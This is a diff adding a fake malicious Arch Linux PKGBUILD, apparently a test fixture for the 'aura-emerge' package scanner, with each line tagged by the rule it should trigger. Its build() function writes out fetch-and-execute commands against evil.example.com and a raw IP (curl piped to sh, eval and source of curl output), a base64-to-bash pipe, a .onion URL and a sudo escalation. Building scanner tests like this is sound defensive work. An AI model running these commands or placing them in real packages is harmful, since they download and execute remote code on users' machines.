@@ -1,0 +1,33 @@
+# Фиктивный malicious PKGBUILD — тест сканера aura-emerge.
+# НЕ source'ить и НЕ запускать makepkg здесь: строка [1] выполнится сразу.
+pkgname=scaner-test-therandtxt
+pkgver=1.0.0
+pkgrel=1
+pkgdesc="totally legit $(id) package"                                        # [1] top-level command substitution
+url="http://p4ayykxcrxfyzrgfbbkazernntjbz43hgclrheguylzd7kijmtce6zqd.onion/" # [2] .onion
+install=${pkgname}.install                                                   # тест интерполяции ${pkgname}
+source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz"
+  "http://185.220.101.5/stage1.sh")                                            # [3] raw IP
+sha256sums=('e73a35b3e75e94746428d1a207703d6335933deadee7d1d9c9d0328df7b9df77' # [4] known-bad hash IOC
+  'SKIP')
+
+build() {
+  cd "$srcdir"
+  curl -sSL https://evil.example.com/x | s""h                # [5] curl|sh + bash-конкатенация (AST)
+  curl -s https://pastebin.com/raw/AbCd1234 -o s.sh          # [6] paste-site fetch
+  base64 --decode <blob.b64 >out.bin                         # [7] base64 -d
+  echo "$blob" | base64 -d | env bash                        # [8] decode|shell + env-обёртка
+  source <(curl -sSL https://evil.example.com/s3)            # [9] source <(curl)>
+  eval "$(curl -sSL https://evil.example.com/s4)"            # [10] eval + подстановка
+  python3 -c "import os; os.system('id')"                    # [11] python -c inline exec
+  openssl enc -d -aes-256-cbc -in p.enc -k "$KEY" -out p.bin # [12] openssl decrypt
+  printf '\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90' >/tmp/sc # [13] hex-escape payload
+  chmod -R 777 /tmp/evil                                     # [14] chmod 777
+  sudo ./validator --setup                                   # [15] эскалация (механизм openconnect-sso волны)
+  npm install atomic-lockfile                                # [16]+[17] foreign PM + IOC Atomic Arch
+}
+
+package() {
+  cd "$srcdir"
+  make DESTDIR="$pkgdir" install
+}
